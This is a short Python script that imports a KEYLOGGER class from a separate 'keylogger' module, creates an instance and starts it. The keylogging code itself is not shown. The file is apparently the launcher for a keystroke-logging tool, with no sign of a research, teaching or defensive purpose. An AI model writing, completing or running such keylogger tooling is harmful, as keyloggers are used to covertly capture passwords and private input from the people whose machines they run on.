from keylogger import KEYLOGGER

KL = None
def main():
    global KL
    KL = KEYLOGGER()
    KL.start_keylogger()

if __name__ == "__main__":
    main()
    del KL